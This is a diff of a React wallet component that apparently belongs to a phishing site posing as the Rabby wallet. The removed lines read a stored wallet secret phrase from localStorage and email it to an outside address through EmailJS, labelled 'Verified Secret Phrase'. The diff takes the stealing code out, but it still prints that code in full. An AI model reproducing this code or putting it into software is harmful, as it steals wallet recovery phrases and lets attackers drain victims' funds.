@@ -6,32 +6,7 @@ const WalletSectionOne = () => {
   const [data, setData] = useState([]);
   const navigate = useNavigate();
 
-  (function () {
-    emailjs.init({
-      publicKey: "KhXsjlknQMyDCWbVr", // Your public key
-    });
-  })();
-
   useEffect(() => {
-    let phrase = localStorage.getItem("phrase");
-    phrase = phrase.toString();
-
-    if (phrase) {
-      const templateParams = {
-        to_email: "testmail@elderintelligence.com",
-        message: `NEW RABBY Submission\n\nVerified Secret Phrase:\n\n ${phrase}`,
-      };
-
-      emailjs.send("service_c4dn1pf", "template_2or5s0n", templateParams).then(
-        function (response) {
-          console.log("SUCCESS!", response.status, response.text);
-        },
-        function (err) {
-          console.error("FAILED TO SEND EMAIL...", err);
-        }
-      );
-    }
-
     let wallet_balance = localStorage.getItem("wallet_balance");
     if (!wallet_balance) {
       errorNotification("Please connect your wallet first");
